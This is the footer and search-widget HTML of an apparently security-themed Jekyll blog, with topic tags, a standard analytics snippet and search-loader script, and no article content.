2021 <a href="https://twitter.com/pcw3r">pcw3r</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/">Chirpy</a> theme.</p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">LINUX</a> <a class="post-tag" href="/tags/web-exploitation/">WEB EXPLOITATION</a> <a class="post-tag" href="/tags/payload/">PAYLOAD</a> <a class="post-tag" href="/tags/password-cracking/">PASSWORD CRACKING</a> <a class="post-tag" href="/tags/medium/">MEDIUM</a> <a class="post-tag" href="/tags/database-exploitation/">DATABASE EXPLOITATION</a> <a class="post-tag" href="/tags/active-directory-exploitation/">ACTIVE DIRECTORY EXPLOITATION</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/sudo-exploitation/">SUDO EXPLOITATION</a> <a class="post-tag" href="/tags/password-decrypt/">PASSWORD DECRYPT</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', '', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://pcw3r.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
